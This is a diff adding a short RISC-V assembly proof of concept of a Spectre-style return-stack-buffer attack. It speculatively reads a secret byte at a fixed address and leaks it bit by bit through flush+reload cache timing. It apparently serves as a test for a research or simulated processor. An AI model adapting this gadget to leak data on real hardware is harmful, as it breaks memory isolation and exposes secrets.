@@ -1,0 +1,59 @@
+
+main:
+	# Set up variables / constants.
+	li	s0, 8		# Loop counter
+	li	s1, 0		# Result
+	li	s2, 0xdeadbeef	# Target address to extract
+	li	s3, 0x100000	# Base address of F+R array
+.Lloop:
+	# Flush cache; steal the next bit.
+	x.flushall
+	mv	a0, s0
+	call	evil
+
+	# Time an access to the address corresponding to a 1 bit.
+	rdcycle	t0
+	fence.i
+	lb	t1, 256(s3)
+	fence.i
+	rdcycle	t1
+
+	# Determine whether the load was cached and insert the resulting bit
+	# at the right position into the result.
+	sub	t0, t1, t0
+	slti	t0, t0, 16
+	sub	t2, zero, s0
+	addi	t2, t2, 8
+	sll	t0, t0, t2
+	or	s1, s1, t0
+
+	# Proceed to next bit if there is one.
+	subi	s0, s0, 1
+	bnez	s0, .Lloop
+
+	# Done; return the extracted byte for easy inspection.
+	mv	a0, s1
+	li	a7, -1
+	ecall
+
+evil:
+	# Avoid speculation into the sensitive code.
+	fence.i
+
+	# The jump confuses the RSB: The RSB treats t0 as a link register and
+	# hence pushes the next instruction's address; however, .Levil_ret
+	# returns via ra instead of t0.
+	# The memory load merely prevents the jump from retiring too quickly.
+	lb	t0, 4(s3)
+	jal	t0, .Levil_ret
+
+	# Extract the a0'th bit of the value at t2 (i.e. 0xdeadbeef).
+	lbu	t0, (s2)
+	sll	t0, t0, a0
+	andi	t0, t0, 256
+	or	t0, t0, s3
+	lb	t0, (t0)
+
+.Levil_ret:
+	# Entry into gadget.
+	ret
